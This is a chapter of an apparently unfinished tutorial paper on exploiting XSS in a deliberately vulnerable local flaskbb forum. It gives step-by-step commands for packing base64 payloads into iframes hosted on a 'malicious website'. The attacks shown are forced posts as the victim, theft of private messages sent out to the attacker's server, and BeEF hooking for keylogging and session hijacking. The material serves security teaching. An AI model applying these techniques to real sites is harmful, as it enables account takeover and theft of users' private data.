IV. Exploitations
=================

What is idea behind exploiting a XSS vulnerability ?
----------------------------------------------------

XSS exploitation requires careful planning of the attack we want to run against the target. Ultimately, it will allow us to :

    perform any action the target can perform in this domain
    access any information the target has access to in this domain

Instead of an "alert(1)", we will actually ship a specifically crafted javascript payload, which will run in the background, silently executing all the steps we want to execute on behalf of the user. It requires prior analysis of the website or application.

Let's go straight to examples.

Given a vulnerable application, we will try to develop some realistic attack scenarios. The focus is really not on triggering the XSS, but rather demonstrating ways to fully exploit it.
First we will setup a vulnerable application, then propose 3 different attacks :

    - execute actions on behalf of user
    - steal private information
    - Man In the Browser attack : interactive session hijacking, keylogger, browser exploits...
        
A. Setup the vulnerable application : a forum.
----------------------------------------------
In an attempt to be as realistic as possible, I decided to start with a real full-fledged application. I choose flaskbb[0], a forum developed in python using flask.

First step is to add our extra XSS "feature". I kept it simple by adding a new route to the project, where you can provide base64-encoded javascript to be executed. For example, executing "alert(1)" will look like this :

    localhost:8080/xss/YWxlcnQoMSkK

![Demo : alert(1)](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/alert.png)

The base64 is a handy way to avoid conflicts between our payloads and flask's route matching rules[Appendix0TODO](https://github.com/centime/xss-paper/blob/master/6.Appendix.md), and more important allows us to bypass flask's parameters sanitizing before template generation. It will also work around any protection from the browser. Implementation steps are provided here[Appendix1TODO](https://github.com/centime/xss-paper/blob/master/6.Appendix.md)

Bonus : flaskbb is kind enough to come in the dev version with a test function to populate it with dummy users, topics and posts !

B. Post a message on behalf of a user.
---------------------------------------
First, let's introduce two tools that we will use : 

    burp[2] : An HTTP proxy, often used in web penetration tests because it is awesome. We will just scratch the surface here, using it to log our http traffic.
              Basically, it will allow us to record all our HTTP traffic, and export logs of it.
    xssless[3] : A python script to generate XSS payloads from burp's logs. Best part is that it takes care of crsf tokens (nonces) !

The procedure is as follow : 

    1) log in with a user we control.
    2) start burp's interception
    3) post a new message.
    4) stop burp's interception and export logs
    5) list the csrf tokens
    6) run xssless
    7) modify the payload with our malicious message
    8) craft our exploit
    9) expose targeted users to our exploit

Steps 1-4 I won't describe, burp is widely documented across the web.

Step 5 : In the requests that burp intercepted, we look for any parameter that might be a csrf token. It's usually obvious, and it certainly is here.

    #Create a file with the identifier of the csrf token(s)
    echo 'csrf_token' > params

Step 6 : Xssless is nice because we don't even have to have a deep look into what's going on. We could probably skip some requests, but we know that repoducing step by step what we recorded will work. We just need to tell it which parameters to adapt dynamically.

    #Run xssless, and feed him the list of crsf token(s) as well as the logs from burp.
    xssless -s -p params ../burp-logs/post-topic.burp > post-topic.js

You can see the resulting code here[Appendix2TODO](https://github.com/centime/xss-paper/blob/master/payloads/post-topic.js).

Step 7 : Now you can edit the payload to replace the title or content of the post you want. 

    #As we can see, in this example the post will have "I think" for title, and "I've been hacked." for content.
    grep content post-topic.js
        [...] &title=I+think&content=I%27ve+been+hacked+%3A%28 [...]

Just don't forget to url-encode your texts.

Step 8 : At this point we should run our payload through a js minifyer[4TODO]. Here we won't, for the sake of simplicity. To have a working exploit we need however the base64 of our payload, and to remove the script tag :
    
    #Well, remove the script tags and base64 the rest...
    grep -v script post-topic.js | base64 -w0 > post-topic.b64

Step 9 : Now, all we have to do is put it somewhere on internet, inside an iFrame pointing to the vulnerability, and bring authenticated users of our forum to visit it.

    #Insert the payload at the end of the vulnerable URL, and put it all in the src attribute of an iFrame
    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/post-topic.b64)'></iframe>" > malicious-website/post-topic.html

    #Start an instance of our malicious HTTP server, on localhost:1337
    cd malicious-website && python3 -m http.server 1337

Step 10 : profit !  
![Exploit : Post a message on behalf of a victim](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/post-topic.png)
    
    1. Target gets the exploit delivered
    2. Target follows the iFrame
    3. Target executes the script, sending requests...
       ...and ultimately sends the final POST request, which creates the new post.

C. Read a user's private conversations.
-----------------------------------------

So, here I hand-crafted an exploit[Appendix3TODO](https://github.com/centime/xss-paper/blob/master/payloads/read-private.js) 
. This is classic javascript programming, so I won't explain in detail, but here is what it does when executed :
    
    -request user/messages/inbox
    -parse the response to get the private messages received. For each, we can extract title, author, and a link to the content
    -request each of thoses new links
    -parse the responses to get the content of each message
    -wrap it all in a serialized json, urlencode, and ship it in a GET request to our malicious website.

Of course, like most exploits, this code isn't a piece of art. But hey, it works. Now, let's package it, as we did for the previous one :

    #Base64 encode the JS
    base64 -w0 read-private.js > read-private.b64

    #Put everything together in an iFrame
    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/read-private.b64)'></iframe>" > malicious-website/read-private.html

    #Start our malicious website
    cd malicious-website && python3 -m http.server 1337

When an authenticated user (test2 in my case) visits localhost:1337/read-private.html, our malicious server quicly receives a GET containing all the stolen messages :

![Exploit : reading private messages](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/read-private.png)

    1. Target gets the exploit delivered
    2. Target follows the iFrame
    3. Target executes the script, sending requests to fetch the messages... (not all visible here)
       ...and ultimately sends the GET request containing all the data, back to our malicious website
    4. Attacker receives the data (url-encoded)
    5. Attacker decodes the data

D. Man In the Browser
---------------------

###Explanations
While it may take many forms, the way it is achieved using an XSS vulnerability is usually by opening a Websocket connection back to attacker's server.
This gives us a full, interactive access to the page's javascript environment.
Granted, it is a limited form of MitB attack, since (until further exploitation), we are restricted to the page where lies the XSS.

This kind of attack, requiring elaborated architectures, would be complicated to set up wouldn't it be already some fully functional existing solution. The most famous being BeEF\cite{beef} (short for The Browser Exploitation Framework).
        
###BeEF
BeEF is a server that you run on your machine as the attacker. It serves two main ressources over HTTP : a user interface, and a file $hook.js$. When $hook.js$ is executed on a webpage, the websocket previously mentioned is instanciated. The browser who executed it is then $hooked$.

When you connect to the user interface, you have access to a list of all the browsers that are or have been $hooked$. To thoses who are currently, you can send $commands$, presented to you by BeEF amongst a huge list of attacks and exploits that you could want to launch.

Detailling all the exploits, and even just their categories, would be very long and thus is out of the scope of this paper.

alternative : xenotix[7]
    
###Add a BeEF hook to our page :
Craft a payload to load the hook. This is a really simple and straight-forward javascript code[Appendix-7] :

    Create a $<script>$ element.
    Set its $url$ attribute to our $hook.js$.
    (optional) Set its $type$ attribute.
    Append it to the head of the document.

turn it into an exploit :

    base64 -w0 add-hook.js > add-hook.b64

    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/add-hook.b64)'></iframe>" > malicious-website/add-hook.html
    cd malicious-website && python3 -m http.server 1337

Start the BeEF server, connect to it using the web interface, and wait for a visitor..

![BeEF : ui](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-1.png)



###Key logger
    
    The login page will probably be different from the one we have our XSS in. As is, if the user clicks a link and/or changes page, the hook will be broken. We can prevent it with different technics, one of them is using the "Man In the Browser" attack from BeEF. It will carry the hook amongst clicked links.

    There is no additional step because the key logging functionality is enabled by default. We can see all of the user's inputs under the $log$ panel.

![Demo : MItB](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-MItB.png)

    All actions and inputs are recorded under the "logs" panel.

![BeEF : keylogger](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-keylogger.png)

User "test1" typed password "test"

This is the only attack presented here that doesn't require the user to be authenticated in the forum to work. Actually, it obviously won't work if the user is already in, as he won't be required to enter his password. The work-around for this situation is easy for the attacker : just use a small script to log the user out, he will most probably try to log back in.


###Stored passwords recovery
    
    TODO
    for the domain.
    test beef ?

###Interactive session hijacking

        Beef > target > use as proxy

![BeEF : use as proxy](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-useproxy.png)

        chromium --temp-profile --proxy-server=localhost:6789

![BeEF : proxy](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-proxy.png)

    Unfortunately, I couldn't manage to get it to work. The requests stay blocked somewhere between BeEF and the zombie... 


###More
    Metasploit : AutoPWN !
    Social Engineering
    Network
    Botnet
    ...
    TODO
    TODO screenshots
    


Summary
-------
    Specific payloads
        precise, effective
        single use
        discreet

    Exploitation framework
        powerfull (scary)
        versatile
        fingerprint

    Of course, the examples presented here are just a few basic ones... use your imagination ! (worms anyone ?)




Refs
----
    [0] https://github.com/sh4nks/flaskbb
    [2] http://portswigger.net/burp/
    [3] https://github.com/mandatoryprogrammer/xssless
    [6] http://beefproject.com/
    [7] http://xenotix.in/


